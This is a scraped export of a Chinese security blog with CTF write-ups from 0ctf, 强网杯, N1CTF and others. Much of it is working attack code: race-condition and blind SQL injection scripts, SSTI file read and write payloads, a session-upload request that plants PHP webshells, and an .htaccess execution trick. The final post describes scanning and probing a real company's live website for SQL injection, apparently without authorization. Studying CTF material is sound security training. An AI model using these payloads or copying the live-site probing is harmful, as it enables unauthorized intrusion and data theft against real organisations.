123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137# coding: utf-8from threading import Threadimport requestsimport stringfrom random import *import sysimport reimport timeallchar = string.ascii_letters + string.digitsclass monThread(Thread): ### ### Initiation d'un thread avec création d'un utilisateur unique puis connexion pour obtenir un cookie valide ### def __init__(self, ip, port): Thread.__init__(self) self.username =\"\".join(choice(allchar) for x in range(randint(8, 12))) self.password = \"\".join(choice(allchar) for x in range(randint(8, 12))) self.target_url = \"http://\" + ip + \":\" + str(port) + \"/\" r1 = requests.post(self.target_url + \"register.php\", data = &#123;\"rUsername\":self.username, \"rPassword\":self.password, \"rPassword2\":self.password&#125;) r2 = requests.get(self.target_url) rCookie = requests.utils.dict_from_cookiejar(r2.cookies) self.cookie = rCookie.get(rCookie.keys()[0]) r3 = requests.post(self.target_url + \"login.php\", data = &#123;\"username\":self.username, \"password\":self.password&#125;, cookies = &#123;\"PHPSESSID\":self.cookie&#125;) ### ### On achète le billet 12 (car en promo à 900 donc +450 miles si race condition ok) ### def run(self): r4 = requests.post(self.target_url + \"myairline/buy_ticket.php\", cookies = &#123;\"PHPSESSID\":self.cookie&#125;, data = &#123;\"idFlightPost\":12&#125;) def getMilesIfCanFlag(self): r5 = requests.get(self.target_url + \"myairline/\", cookies = &#123;\"PHPSESSID\":self.cookie&#125;) regex = r\".*Balance : (.*) Miles\" strPage = r5.text match = re.search(regex, strPage) self.miles_account = match.group(1) if(int(self.miles_account) &gt; 1400): return 1 return 0 def getFlag(self): r7 = requests.post(self.target_url + \"myairline/buy_ticket.php\", cookies = &#123;\"PHPSESSID\":self.cookie&#125;, data = &#123;\"idFlightPost\":7&#125;) r6 = requests.get(self.target_url + \"myairline/mytickets.php\", cookies = &#123;\"PHPSESSID\":self.cookie&#125;) regex = r\".*NDH&#123;(.*)&#125;\" strPage = r6.text match = re.search(regex, strPage) return match.group(1) def getUsername(self): return self.username def getPassword(self): return self.passworddef progress(count, total, status=''): bar_len = 60 filled_len = int(round(bar_len * count / float(total))) percents = round(100.0 * count / float(total), 1) bar = '=' * filled_len + '-' * (bar_len - filled_len) sys.stdout.write('[%s] %s%s ...%s\\r' % (bar, percents, '%', status)) sys.stdout.flush()def main(ip, port): listThread = [] nThreads = 300 print \"\\n\" print \"###########################\" print \"User creation in process...\" for i in range(1, nThreads): thread = monThread(ip, port) listThread.append(thread) progress(i+1, nThreads) print \"\" print \"Done !\" print \"###########################\" print \"\" print \"###########################\" print \"All threads are trying to buy the discounted ticket for Dubai worth 900 miles \\nin order to cause a race condition and get the promotion (450 miles) without buying the ticket...\" for i in range(0, nThreads-1): listThread[i].start() j = 0 flag = \"\" username = \"\" password = \"\" cptWinner = 0 for i in range(0, nThreads-1): if(listThread[i].getMilesIfCanFlag()): if(j == 0): flag = listThread[i].getFlag() username = listThread[i].getUsername() password = listThread[i].getPassword() j += 1 cptWinner += 1 listThread[i].join() print \"\" print str(cptWinner) + \" account(s) won the race!\" print \"\" if flag != \"\": print \"Using the first one to get the flag...\" print \"Username : \" + username print \"Password : \" + password print \"Flag is : NDH&#123;\" + flag + \"&#125;\" else: print \"Cannot get the flag :(\" print \"###########################\"if __name__ == '__main__': print \"______ ___ _ _ _____ _ ___ ___ _ _ \" print \"| ___ \\ / _ \\ (_) | |_ _| | | \\/ | | | (_) \" print \"| |_/ /__ _ ___ ___/ /_\\ \\ __ _ __ _ _ _ __ ___| |_| | | |__ ___| . . | __ _ ___| |__ _ _ __ ___ \" print \"| // _` |/ __/ _ \\ _ |/ _` |/ _` | | '_ \\/ __| __| | | '_ \\ / _ \\ |\\/| |/ _` |/ __| '_ \\| | '_ \\ / _ \\\\\" print \"| |\\ \\ (_| | (_| __/ | | | (_| | (_| | | | | \\__ \\ |_| | | | | | __/ | | | (_| | (__| | | | | | | | __/\" print \"\\_| \\_\\__,_|\\___\\___\\_| |_/\\__, |\\__,_|_|_| |_|___/\\__\\_/ |_| |_|\\___\\_| |_/\\__,_|\\___|_| |_|_|_| |_|\\___|\" print \" __/ | \" print \" |___/ \" if(len(sys.argv) &gt;= 2 ): main(sys.argv[1], sys.argv[2]) else: print '' print 'Usage: exploit.py IP PORT' 0ctf宝可梦1这题很好玩 随便注册个号进去会让你猜神奇宝贝的名字 但是猜到徽章满也没给flag??? 看下排行榜发现admin显示的是白金账号 尝试登陆admin admin 在个人页面中看到了flag…… 顺便提一下这题的验证码计算起来比较复杂 可以用css calc https://www.cnblogs.com/EnSnail/p/6514171.html 0ctf宝可梦2与1是同样的界面 猜到了个人信息那里是xss 但主页还有个反射型的…不会做 http://www.wupco.cn/?p=4408","categories":[{"name":"writeup","slug":"writeup","permalink":"http://Merl1ng.com/categories/writeup/"}],"tags":[{"name":"misc","slug":"misc","permalink":"http://Merl1ng.com/tags/misc/"},{"name":"web","slug":"web","permalink":"http://Merl1ng.com/tags/web/"}]},{"title":"强网杯wp","slug":"强网杯wp","date":"2018-03-27T15:52:15.000Z","updated":"2018-05-04T14:46:20.313Z","comments":true,"path":"2018/03/27/强网杯wp/","link":"","permalink":"http://Merl1ng.com/2018/03/27/强网杯wp/","excerpt":"真*神仙打架","text":"真*神仙打架 其他师傅的wp说实话他们写得非常全面了 我感觉我已经不用再咋写了 http://www.cnblogs.com/iamstudy/articles/2th_qiangwangbei_ctf_writeup.html http://seaii-blog.com/index.php/2018/03/26/79.html http://heartsky.info/2018/03/27/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF-Web-Crypto-writeup/ https://blog.csdn.net/wy_97/article/details/79705700 https://lorexxar.cn/2018/03/26/qwb2018/ http://pupiles.com/qiangwangbei.html http://blog.kyrios.cn/2018/03/29/2018-qwb-cnss-wp/ share you midrpo漏洞 就是服务端和客户端对这个URL的解析不一致导致的 类似的在pwnhub上出过 不过当时利用的是css 火日师傅的pwnhub题解https://www.aliyun.com/jiaocheng/640008.html ven师傅的http://www.venenof.com/index.php/archives/324/ 彩蛋预期解 java安全 shiro反序列漏洞 http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html https://blog.zsxsoft.com/post/35 非预期 PostgreSQL 的 UDF提权 Python is the best language 1,2https://xz.aliyun.com/t/2219 1有两个注入点一个在留言板 一个在注册页面 留言板的是直接回显的大家都能看到 所以多待一会就有可能划一个flag 听说晚些时候 admin admin 登进去就有。。。 web签到三层 md5 第一层 == 可以直接使用 0e的字符串或者数组绕过 第二层 === 只能使用数组绕过 第三层 规定了必须为str类型 这时数组绕不过去了 要用用两个有着相同MD5值的文件 https://www.cnblogs.com/Hg-Yyq/p/8641992.html https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value threehit二次注入 其实我做的时候不着啥是二次注入。。。当盲注做的。。 后来发现大佬给出了非盲注的做法 膜。。 1 and 1=2 union select 1,(select flag from flag),3,4# streamgame 1,2,4都是爆破即可 好像是出题人少写了位数 自己写的脚本有点丑 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455import osimport binascii#for a1 in range(0,2):for a2 in range(0,2): for a3 in range(0,2): for a4 in range(0,2): for a5 in range(0,2): for a6 in range(0,2): for a7 in range(0,2): for a8 in range(0,2): for a9 in range(0,2): for a10 in range(0,2): for a11 in range(0,2): for a12 in range(0,2): for a13 in range(0,2): for a14 in range(0,2): for a15 in range(0,2): for a16 in range(0,2): for a17 in range(0,2): for a18 in range(0,2): for a19 in range(0,2): flag=\"%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s\"%(a2,a3,a4,a5,a6,a7,a8,a9,a10,a11,a12,a13,a14,a15,a16,a17,a18,a19) flag=\"flag&#123;1\"+flag+\"&#125;\" #print flag def lfsr(R,mask): output = (R &lt;&lt; 1) &amp; 0xffffff i=(R&amp;mask)&amp;0xffffff lastbit=0 while i!=0: lastbit^=(i&amp;1) i=i&gt;&gt;1 output^=lastbit return (output,lastbit) R=int(flag[5:-1],2) mask = 0b1010011000100011100 f=open(\"test.txt\",\"ab\") for i in range(12): tmp=0 for j in range(8): (R,out)=lfsr(R,mask) tmp=(tmp &lt;&lt; 1)^out f.write(chr(tmp)) f.close() f=open(\"test.txt\",\"rb+\") q = f.read() q=binascii.b2a_hex(q) f.close() my_file = 'D:/1/test.txt' if q==\"5538f742c10db2c7ede0243a\": print (flag) break else: if os.path.exists(my_file): os.remove(my_file) https://blog.csdn.net/qq_38412357/article/details/79696263 Animal机器学习有人直接爆破就出来了 以后还是要梭哈一把 1234567891011121314151617181920from pwn import *import base64image_data = ''with open('./basque-shepherd-dog.jpg', 'rb') as fp:image_data = base64.b64encode(fp.read())while True:conn = remote('117.50.13.213', 12345)conn.recvuntil('plz input your base64 encode pic:')conn.sendline(image_data)res = conn.recvall(timeout=3).strip()if res and res != 'no':print ressleep(7)res = conn.recvall(timeout=3).strip()print ressys.exit(0)conn.close()","categories":[{"name":"writeup","slug":"writeup","permalink":"http://Merl1ng.com/categories/writeup/"}],"tags":[{"name":"misc","slug":"misc","permalink":"http://Merl1ng.com/tags/misc/"},{"name":"web","slug":"web","permalink":"http://Merl1ng.com/tags/web/"}]},{"title":"n1ctfwriteup","slug":"n1ctfwriteup","date":"2018-03-12T09:51:14.000Z","updated":"2018-04-12T14:14:35.813Z","comments":true,"path":"2018/03/12/n1ctfwriteup/","link":"","permalink":"http://Merl1ng.com/2018/03/12/n1ctfwriteup/","excerpt":"比赛时只做出来两道 其他都是后来复现的","text":"比赛时只做出来两道 其他都是后来复现的 web-77777way1当你set一个值后如果下一条语句执行失败 points的值不变 就是有记忆性 这点在比赛时想错了 flag=1111&amp;hi= where (password like 0x25) 发现points的值被设置为了1111 拼接后就是 Update users set points =1111 where (password like 0x25) 然后执行 flag=2222&amp;hi= where (password like 0xff) 发现points值修改失败 仍然是1111 123456789101112131415161718192021222324import requestsimport stringimport urlliburl = \"http://47.97.168.223/index.php\"flag = \"\"true_flag = \"\"for i in range(1,1000): payload = flag for j in \"0123456789\"+string.letters+\"!@#$^&amp;*()&#123;&#125;=+`~_\": data = &#123; \"flag\":\"233333\", \"hi\":urllib.unquote(\" where (password like 0x%s25)\"%(payload+hex(ord(j))[2:])) &#125; r =requests.post(url=url,data=data) if '233333' in r.content: flag += hex(ord(j))[2:] true_flag += j print true_flag data1 = &#123; \"flag\": \"1\", \"hi\": \" where 1\" &#125; s = requests.post(url=url,data=data1) break 脚本和hgame-week4的注入题挺像的 当时在做的时候把注意力都放在了 sprintf和update可能的漏洞上 一直在查那些 而且fuzz不熟练 没有发现哪些没过滤 而且利用点找的不对 当时试的是flag=1&amp;hi= and 1 和flag=1&amp;hi= and 0 没用发现set的记忆性。。 way2flag=1&amp;hi= where ord(substr(password, 1, 1))&gt;64 12345678910111213141516171819202122# -*- coding:utf8 -*-import requestsflag = \"\"url = \"http://47.97.168.223\"for i in range(1,500): for j in range(33,127): data1 = &#123; \"flag\": \"233\", \"hi\": \" where ord(substr(password, %s, 1))&gt;%s\"%(i,j) &#125; data2 = &#123; \"flag\": \"234\", \"hi\": \" where ord(substr(password, %s, 1))&gt;%s\"%(i,j+1) &#125; s = requests.post(url=url,data=data1) if \"233\" in s.content: s = requests.post(url=url,data=data2) if \"233\" in s.content: requests.post(url=url,data=data1) flag += chr(j+1) print flag break 这个脚本是自己写的 way3flag=1&amp;hi=1 &amp;&amp; ord(substr(password, 1, 1))&gt;64 当然还有类似的 way4flag=0&amp;hi=*CONV(HEX((SELECT MID(password,1,1))),16,10)flag=10&amp;hi=|conv(hex(mid((select password),1,1)),16,10)当 select不省略时这两种顺序都可以 可以再简化 flag=10&amp;hi=|conv(hex(mid(password,1,1)),16,10) 如果加select要加() flag=10&amp;hi=|conv(hex(substr((select password),1,1)),16,10)flag=0&amp;hi=*CONV(HEX((SELECT substr(password,1,1))),16,10)当 select不省略时这两种顺序都可以 可以再简化 flag=10&amp;hi=|conv(hex(substr(password,1,1)),16,10) 如果加select要加() 最开始是select from from可舍 不加group_concat下select可舍 web2-777772way1like，部分数字等较多可用均被过滤，发现括号，+，&gt;还在 连数字都waf是真的。。。 flag=1&amp;hi=+(pw &gt; ‘a’) 如果正确points就会被置为2 错误的话就会被置为1 (这里用的不是记忆性) Update users set points =1+(pw &gt; ‘a’) select里也有类似的语句 但是这里第一位是H flag=2&amp;hi=%2b( pw &gt; ‘I’)是2没问题 flag=2&amp;hi=%2b( pw &gt; ‘H’)应该是2的结果却是3 还有( 和pw中间要是没空格也会被过滤。。。 1234567891011121314151617181920212223import requestsimport urlliburl = \"http://47.52.137.90:20000/index.php\"flag = \"\"for i in range(1,1000): for j in range(33,127): payload = urllib.unquote(\"%%2b( pw &gt; '%s')\"%(flag+chr(j))) data = &#123; \"flag\":\"10\", \"hi\":payload &#125; r = requests.post(url=url,data=data) if \"| 10&lt;br/&gt;\" in r.content:#回显的返回值是url编码问题 tmp = urllib.unquote(\"%%2b( pw &gt; '%s')\"%(flag+chr(j-1))) tmp_data = &#123; \"flag\": \"10\", \"hi\": tmp &#125; s = requests.post(url=url,data=tmp_data) if \"| 11&lt;br/&gt;\" in s.content: flag += chr(j-1) print flag break way2选择|进行位注入 flag=10&amp;hi= | IF ((substr( pw ,1,1)&gt;’A’,1,0) 如果正确回显1 错误回显0 flag最后一位必须是0否则 1|任何还是1 flag只是0的话太短可能页面其它地方也有0 还有由于一些数字被过滤了 要用1+1+1… 或length(‘11’)替代 web3-cms文件包含读源码 注意不要带后缀 如index parse_url绕过 命令注入 https://fireshellsecurity.team/n1ctf-funning-eating-cms/ web4-easy&amp;&amp;hard php飘零大佬整理的很强 还多了一篇0ctf的http://skysec.top/2018/04/04/amazing-phpinfo/ 看了bendawang的blog才知道 easy php被非预期了 导致上了hard php 预期解一样的 什么导致了非预期给的docker文件中写到 FROM andreisamuilik/php5.5.9-apache2.4-mysql5.5 pull下来这个docker 发现其中默认目录/var/www/phpinfo/index.php有个phpinfo存在 还有他放了hard.php 里面的run.sh为了修补easy里的漏洞 反而暴露了漏洞的内容 非预期1-session.uploadsession.upload_progress.enabled这个参数在php.ini 默认开启，需要手动置为Off 如果不是Off，就会在上传的过程中生成上传进度文件，它的存储路径可以在phpinfo获取到 /var/lib/php5/sess_{your_php_session_id} 如果你构造一个这样的报文 不断的向服务端发送 1234567891011121314151617181920212223242526272829303132333435POST / HTTP/1.1Host: 47.52.246.175:23333Proxy-Connection: keep-aliveContent-Length: 648Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: nullContent-Type: multipart/form-data; boundary=----WebKitFormBoundary2rwkUEtFdqhGMHqVUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=5uu8r952rejihbg033m5mckb17------WebKitFormBoundary2rwkUEtFdqhGMHqVContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"&lt;?=`echo '&lt;?php eval($_REQUEST[bertram])?&gt;'&gt;bertram.php`?&gt;------WebKitFormBoundary2rwkUEtFdqhGMHqVContent-Disposition: form-data; name=\"file2\"; filename=\"1.php\"Content-Type: text/php&lt;?php eval($_POST[1]);?&gt;------WebKitFormBoundary2rwkUEtFdqhGMHqVContent-Disposition: form-data; name=\"file1\"; filename=\"2.asp\"Content-Type: application/octet-stream&lt; %eval request(\"a\")%&gt;------WebKitFormBoundary2rwkUEtFdqhGMHqVContent-Disposition: form-data; name=\"submit\"Submit------WebKitFormBoundary2rwkUEtFdqhGMHqV-- 就会在 /var/lib/php5/sess_5uu8r952rejihbg033m5mckb17不断刷新生成包含恶意php代码的文件 然后通过LFI包含这个文件 action=../../../../../var/lib/php5/sess_5uu8r952rejihbg033m5mckb17即可getshell http://dann.com.br/php-winning-the-race-condition-vs-temporary-file-upload-alternative-way-to-easy_php-n1ctf2018/ 非预期2-xdebug在phpinfo中看到remote_connect_back = Off,但是那个是php-cli的，而实际下载下来的镜像跑起来看到的是开着的，即php-fpm实际是开着的，所以能够直接getshel fpm与cli区别看 https://segmentfault.com/q/1010000004664671 然后就是rr大佬的方法 在whctf上出过 https://www.xctf.org.cn/library/details/whctf-writeup/ https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface 非预期3临时文件竞争http://dann.com.br/php-winning-the-race-condition-vs-temporary-file-upload-alternative-way-to-easy_php-n1ctf2018/","categories":[],"tags":[]},{"title":"近期看的题目","slug":"近期看的题目","date":"2018-03-09T05:19:07.000Z","updated":"2018-06-02T10:44:00.884Z","comments":true,"path":"2018/03/09/近期看的题目/","link":"","permalink":"http://Merl1ng.com/2018/03/09/近期看的题目/","excerpt":"最近看师傅们的博客学了不少","text":"最近看师傅们的博客学了不少 服务端模板注入攻击(SSTI)http://klaus.link/2017/Flask_SSTI/ 5000端口 测试 xxx:5000/36 如果发现 12Oops! That page doesn't exist.http://xxx:5000/36 则确定是模板注入 然后读写文件 读flag 1http://xxx:5000/&#123;&#123;''.__class__.__mro__[2].__subclasses__()[40]('./flag', 'r').read()&#125;&#125; 写文件1http://xxx:5000/&#123;&#123;''.__class__.__mro__[2].__subclasses__()[40]('/tmp/test', 'w').write('abc') 话说这两个payload如果是``包着md会报错。。 当有waf时func_globals被过滤了，我们使用getattribute绕过，例如ls一类的关键字我们使用这样的形式拆分’l’+’s /home/ctf’ Gopher协议攻击MySqlhttp://www.freebuf.com/articles/web/159342.htmlhttps://ricterz.me/posts/%E5%88%A9%E7%94%A8%20gopher%20%E5%8D%8F%E8%AE%AE%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2 还在看。。。 sql测后台语句一把梭username = admin’#username = admin’ or 1=1#username = admin’) or 1=1#username = admin or 1=1#username = admin” or 1=1#username = admin”) or 1=1# sql时间盲注-1题目bak泄露读源码 12345678?php$username = base64_decode($_COOKIE['name']);$sql = \"select * from user where username = '&#123;$username&#125;'\";$re = mysqli_query($conn, $sql);$rs = mysqli_fetch_array($re);// echo $rs['flag'];echo $username . '&lt;br/&gt;';echo \"因为出题人太懒了，所以现在没有任何功能\"; sky大佬的脚本 1234567891011121314151617181920import requestsimport base64import urlliburl = \"http://123.206.203.108:10010/normalSQLi/index.php\"flag = \"\"for i in range(1,1000): for j in range(33,127): #payload = \"admin' or if((ascii(substr((),%s,1))=%s),sleep(3),false)#\"%(i,j) user #payload = \"admin' or if((ascii(substr((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),%s,1))=%s),sleep(3),false)#\"%(i,j) user #payload = \"admin' or if((ascii(substr((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='user'),%s,1))=%s),sleep(3),false)#\"%(i,j) payload = \"admin' or if((ascii(substr((select flag from user limit 2,1),%s,1))=%s),sleep(3),false)#\"%(i,j) cookie = &#123; \"name\":urllib.quote(base64.b64encode(payload)) &#125; try: r = requests.get(url=url,cookies=cookie,timeout=2.5) except: flag +=chr(j) print flag break if 条件满足执行sleep 不满足执行的那个没用 写啥都行 比如 false 0 1 而且 or 改成 and 也完全没有问题 因为脚本捕获异常 只要让timeout设置的值小于sleep的参数 就完全ok 就是当ascii=64错误 执行if后一个语句 直到ascii=x正确 此时执行sleep 导致抛出异常 执行except 打印flag 所以跟 or/and 和if不满足时执行的东西都无关 只是填充罢了 admin位置填啥要根据题目 sql时间盲注-2题目每次刷新都会随机显示一个四位 123456789101112131415161718192021222324252627282930313233import requestsimport hashlibdef md5(str1): return hashlib.md5(str1).hexdigest()def md5_fuck(str1): i = 0 while True: if md5(str(i))[4:8] == str1: return i else: i+=1cookie = &#123; \"PHPSESSID\":\"6760c930541b7fd8b74b75676c625c18\"&#125;flag=\"\"url = \"http://118.25.18.223:10086/index.php\"for i in range(1,10000): for j in range(33,127): r = requests.get(url=url, cookies=cookie) code_str = r.content[130:134] code_need = md5_fuck(code_str) #id_my = '''1' or if((ascii(mid((database()),%s,1))=%s),sleep(5),1)%%23'''%(i,j) week3_sqli1 #id_my = '''1' or if((ascii(mid((select group_concat(table_name) from information_schema.TABLES where TABLE_SCHEMA=database()),%s,1))=%s),sleep(3),1)%%23'''%(i,j) users,w3_fllllllll4ag #id_my = '''1' or if((ascii(mid((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='w3_fllllllll4ag'),%s,1))=%s),sleep(3),1)%%23'''%(i,j) dajiangyoude,haishijiangyou,f111144g_w3_sqli1 id_my = '''1' or if((ascii(mid((select f111144g_w3_sqli1 from w3_fllllllll4ag limit 0,1),%s,1))=%s),sleep(3),1)%%23'''%(i,j) url_good = \"http://118.25.18.223:10086/index.php?id=%s&amp;code=%s\" % (id_my, code_need) try: s = requests.get(url=url_good, cookies=cookie,timeout=2.5) # print s.content except: flag +=chr(j) print flag break 代码逻辑其实很简单 常规时间盲注结合一个md5操作 但有一点我还不懂 r.content[130:134] 咋知道的四位字符的位置 当然这点可以正则代替 还可以试出来 加一句 print r.content[0:xx]。。。。。 .hexdigest()是返回十六进制 因为从给出的四位来看是十六进制的 过滤了substr 但好像无法fuzz 这点很难受 在python里要是写%23会报错 写成%%23 为啥是三引号是因为如果两个单引号引号包不住 and 和 if还会被当做关键字执行 (可以看编辑器中颜色的变化) 我试了试如果把 1’移到下面 是可以用单引号包住的 12id_my = 'and if((ascii(mid((select f111144g_w3_sqli1 from w3_fllllllll4ag limit 0,1),%s,1))=%s),sleep(3),1)--+'%(i,j)url_good = \"http://118.25.18.223:10086/index.php?id=1' %s&amp;code=%s\" % (id_my, code_need) 当然直接打个双引号就可以 还有跑脚本的时候出现了跑错的情况 跑出来了其它字符。。 还是要多跑几遍确认下 判断是否存在时间盲注可以 ?id=1&#39; and if(ascii(substr(database(),1,1))&gt;127, 0, sleep(5)) %23 ?id=1&#39; and if(ascii(substr(database(),1,1))&gt;64, 0, sleep(5)) %23 从执行的时间看 sql-like文件泄露index.php~ 12345678910111213141516171819202122232425&lt;?php error_reporting(0); include(\"sql.php\"); $waf=\"/(union|group by|=|&gt;|&lt;|hex| |lower|strcmp|updatexml|xmlelement|extractvalue|concat|bin|sleep|mid\\(|substr|left|ascii|\\/\\*|\\*\\/)/i\"; if(isset($_GET['user']))&#123; if(preg_match_all($waf,$_GET['user'])!=0)&#123; $user=\"admin\"; &#125;else&#123; $user = str_replace(\"'\",\"\\'\",$_GET['user']); &#125; //echo $user.\"&lt;br&gt;\"; $sqli = new mysqli($host,$username,$passwd,$database); $sqli-&gt;set_charset(\"gbk\"); $query=\"select * from users where username='\".$user.\"'\"; $result = $sqli-&gt;query($query); //echo $sqli-&gt;error; $num=0; @$num = $result-&gt;num_rows; if($num&gt;0)&#123; while($row = $result-&gt;fetch_row())&#123; echo $row[0].\"&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;\".$row[1].\"&amp;nbsp;&amp;nbsp;&amp;nbsp;\".$row[2].\"&lt;br&gt;\"; &#125; &#125; &#125; $user = str_replace(&quot;&#39;&quot;,&quot;\\&#39;&quot;,$_GET[&#39;user&#39;]); 这句话的作用类似于 addslashes() 造成了宽字节注入 12345678910111213141516171819import requestsimport stringurl = \"http://118.25.18.223:10088/?user=\"flag = \"\"true_flag = \"\"for i in range(1,1000): payload = flag for j in \"0123456789\"+string.letters+\"!@#$^&amp;*()&#123;&#125;=+`~_\": #my = \"%%df%%27%%0aor%%0a((select%%0adatabase())%%0alike%%0a0x%s25)%%23\"%(payload+hex(ord(j))[2:]) #my = \"%%df%%27%%0aor%%0a((select%%0aTABLE_NAME%%0afrom%%0ainformation_schema.TABLES%%0awhere%%0aTABLE_SCHEMA%%0alike%%0adatabase()limit%%0a0,1)%%0alike%%0a0x%s25)%%23\"%(payload+hex(ord(j))[2:]) #flllllag #my = \"%%df%%27%%0aor%%0a((select%%0aCOLUMN_NAME%%0afrom%%0ainformation_schema.COLUMNS%%0awhere%%0aTABLE_NAME%%0alike%%0a0x666c6c6c6c6c6167%%0alimit%%0a2,1)%%0alike%%0a0x%s25)%%23\"%(payload+hex(ord(j))[2:]) #notflag thisisflag my = \"%%df%%27%%0aor%%0a((select%%0athisisflag%%0afrom%%0aflllllag)%%0alike%%0a0x%s25)%%23\"%(payload+hex(ord(j))[2:]) #notflag thisisflag url1 = url+my r =requests.get(url=url1) if '998' in r.content: flag += hex(ord(j))[2:] true_flag += j print true_flag break ord() 函数返回字符串的首个字符的 ASCII 值 [2:] 从第三位开始 应该是从hex函数后产生的0x后开始 绕过ascii的过滤 也是因为此 j 是 &quot;0123456789&quot;+string.letters+&quot;!@#$^&amp;*(){}=+~_”` 0xplayload25 末尾的 25十六进制是% 。。。看了半天才看懂 真是巧妙利用了 like进行注入 这里单引号前闭合啥回显都不变 1’ admin’ 猜测是错误值 所以这里用and的话咋都跑不出来 实际的url是这样的 ###sql盲注 过滤逗号 空格 登陆框 只有用户名是admin时才会提示密码错误 其他情况下提示用户名不存在 很明显要直接查password username=admin’^(ascii(substr((select(password))from(1)))&gt;127)#&amp;password=1 绕过 123456789101112131415161718# -*- coding:utf8 -*-import requestsflag = \"\"url = \"http://118.89.219.210:49167/index.php\"for i in range(25,500): for j in range(33,127): #payload =\"admin'^(ascii(substr((select(database()))from(%s)))&gt;%s)#\"%(i,j) payload =\"admin'^(ascii(substr((select(password))from(%s)))&gt;%s)#\"%(i,j)#51b7a76d51e70b419f60d3473fb6f900 md5 data = &#123;'username':payload,'password':'123'&#125; s = requests.post(url,data=data).text #print \"i:\",i,\"j:\",j if \"username does not exist!\" not in s: flag += chr(j) print flag break sql报错注入+读文件过滤了空格 可用/**/ %0a %0b绕过 过滤了单引号 可转十六进制 部分可用反引号``绕过 load_file()函数读文件 采用updatexml()或者extractvalue()报错注入 把题目中给的文件路径转为16进制 注意不管是updatexml()或者extractvalue()(这两格式上还是有点区别的)只能爆出32位 要结合 substr/substring/mid来使用 不过这题过滤了mid 格式 updatexml(1,concat(0x7e,version(),0x7e),1) extractvalue()后面少个1 先看下长度 ?id=1//and//extractvalue(1,concat(0x7e,(select/**/(length(load_file(0x2f7661722f746573742f6b65795f312e706870)))),0x7e)) ?id=1%0aand//extractvalue(1,concat(0x7e,(select//(substring(load_file(0x2f7661722f746573742f6b65795f312e706870),1,32))),0x7e)) ?id=1%0aand//extractvalue(1,concat(0x7e,(select//(substring(load_file(0x2f7661722f746573742f6b65795f312e706870),32,32))),0x7e)) ?id=1%0aand//extractvalue(1,concat(0x7e,(select//(substring(load_file(0x2f7661722f746573742f6b65795f312e706870),63,32))),0x7e)) 这里每次加31否侧会漏一个。。。 .htaccess 文件上传上传一个.htaccess文件 123&lt;FilesMatch \"merl1n\"&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 那么文件名匹配到 merl1n 的则会交由 php handler 执行 接着就可以任意执行 php 代码了 比如这个题1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374&lt;?php$fail = str_repeat('fail', 100);$d = 'sandbox/FAIL_' . sha1($_SERVER['REMOTE_ADDR'] . '95aca804b832f4c329d8c0e7c789b02b') . '/';@mkdir($d);function read_ok($f)&#123; return strstr($f, 'FAIL_') === FALSE &amp;&amp; strstr($f, '/proc/') === FALSE &amp;&amp; strstr($f, '/dev/') === FALSE;&#125;function write_ok($f)&#123; return strstr($f, '..') === FALSE &amp;&amp; read_ok($f);&#125;function GetDirectorySize($path)&#123; $bytestotal = 0; $path = realpath($path); if ($path !== false &amp;&amp; $path != '' &amp;&amp; file_exists($path)) &#123; foreach (new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path, FilesystemIterator::SKIP_DOTS)) as $object) &#123; $bytestotal += $object-&gt;getSize(); &#125; &#125; return $bytestotal;&#125;if (isset($_GET['action'])) &#123; if ($_GET['action'] == 'pwd') &#123; echo $d; exit; &#125; else if ($_GET['action'] == 'phpinfo') &#123; phpinfo(); exit; &#125; else if ($_GET['action'] == 'read') &#123; $f = $_GET['filename']; if (read_ok($f)) echo file_get_contents($d . $f); else echo $fail; exit; &#125; else if ($_GET['action'] == 'write') &#123; $f = $_GET['filename']; if (write_ok($f) &amp;&amp; strstr($f, 'ph') === FALSE &amp;&amp; $_FILES['file']['size'] &lt; 10000) &#123; print_r($_FILES['file']); print_r(move_uploaded_file($_FILES['file']['tmp_name'], $d . $f)); &#125; else echo $fail; if (GetDirectorySize($d) &gt; 10000) &#123; rmdir($d); &#125; exit; &#125; else if ($_GET['action'] == 'delete') &#123; $f = $_GET['filename']; if (write_ok($f)) print_r(unlink($d . $f)); else echo $fail; exit; &#125;&#125;highlight_file(__FILE__); crlfhttps://blog.csdn.net/qq_19876131/article/details/50577995","categories":[{"name":"web","slug":"web","permalink":"http://Merl1ng.com/categories/web/"}],"tags":[]},{"title":"sql盲注实战","slug":"sql盲注实战","date":"2018-03-07T12:03:51.000Z","updated":"2018-03-17T15:58:02.345Z","comments":true,"path":"2018/03/07/sql盲注实战/","link":"","permalink":"http://Merl1ng.com/2018/03/07/sql盲注实战/","excerpt":"这站其实有回显的 但还是选择练习下盲注","text":"这站其实有回显的 但还是选择练习下盲注 目标网站 http://www.kabelindo.co.id 稍微扫了一下 一堆洞。。 信息收集虽然对这道题没啥用 但还是走一波流程 ping拿ip whois 同服务器下的网站 服务器类型 开放的端口 开了好多。。。 寻找注入点首先注入的页面在 http://www.kabelindo.co.id/readnews.php 这直接报错信息都扔在外面。。。 